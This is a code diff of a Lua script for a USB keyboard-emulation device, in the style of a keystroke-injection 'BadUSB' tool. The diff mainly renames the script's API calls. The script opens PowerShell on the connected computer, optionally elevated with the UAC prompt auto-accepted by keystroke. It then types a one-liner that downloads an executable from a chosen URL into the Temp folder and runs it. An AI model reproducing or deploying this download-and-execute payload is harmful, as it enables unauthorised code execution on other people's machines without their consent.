@@ -6,53 +6,57 @@
 --- directly translated from the Java version in previous builds
 ---
 
-local file = ask("File to download?", "https://github.com/Netdex/FlyingCursors/releases/download/1.0.0/FlyingCursors.exe")
-local runAs = should("Task UAC", "Launch exe as admin?");
+usb = luausb.create({ id = 0, type = "keyboard" })
+kb = usb.dev[1]
 
-while not cancelled() do
-    log("idle")
+local file = usb.ask("File to download?", "https://github.com/Netdex/FlyingCursors/releases/download/1.0.0/FlyingCursors.exe")
+local runAs = usb.should("Task UAC", "Launch exe as admin?");
+
+while true do
+    usb.log("idle")
 
     -- poll until /dev/hidg0 is writable
-    while not cancelled() and not test() do delay(1000) end
-    if cancelled() then break end
+    while kb.test() do
+        usb.delay(1000)
+    end
 
-    log("running")
-    delay(1000)
+    usb.log("running")
+    usb.delay(1000)
 
-    log("opening powershell, runAs=" .. tostring(runAs))
+    usb.log("opening powershell, runAs=" .. tostring(runAs))
     if runAs then
         -- when running elevated prompt sometimes it pops in background, so we need
         -- to go to the desktop
-        press_keys(kb.LSUPER, kb.D)
-        delay(500)
-        press_keys(kb.LSUPER, kb.R)
-        delay(2000)
-        send_string("powershell Start-Process powershell -Verb runAs\n")
-        delay(3000)
-        press_keys(kb.LALT, kb.Y)
-        delay(2000)
+        kb.press_keys(kb.LSUPER, kb.D)
+        usb.delay(500)
+        kb.press_keys(kb.LSUPER, kb.R)
+        usb.delay(2000)
+        kb.send_string("powershell Start-Process powershell -Verb runAs\n")
+        usb.delay(3000)
+        kb.press_keys(kb.LALT, kb.Y)
+        usb.delay(2000)
     else
-        press_keys(kb.LSUPER, kb.R)
-        delay(2000)
-        send_string("powershell\n")
-        delay(2000)
+        kb.press_keys(kb.LSUPER, kb.R)
+        usb.delay(2000)
+        kb.send_string("powershell\n")
+        usb.delay(2000)
     end
 
-    log("download + execute code")
+    usb.log("download + execute code")
 
-    send_string(
-    "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$d=New-Object System.Net.WebClient;" ..
-    "$u='" .. file .. "';" ..
-    "$f=\"$Env:Temp\\a.exe\";$d.DownloadFile($u,$f);" ..
-    "$e=New-Object -com shell.application;" ..
-    "$e.shellexecute($f);" ..
-    "exit;\n"
+    kb.send_string(
+            "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$d=New-Object System.Net.WebClient;" ..
+                    "$u='" .. file .. "';" ..
+                    "$f=\"$Env:Temp\\a.exe\";$d.DownloadFile($u,$f);" ..
+                    "$e=New-Object -com shell.application;" ..
+                    "$e.shellexecute($f);" ..
+                    "exit;\n"
     )
 
-    log("done")
-    while not cancelled() and test() do
+    usb.log("done")
+    while kb.test() do
         delay(1000)
     end
-    log("disconnected")
+    usb.log("disconnected")
 end
 
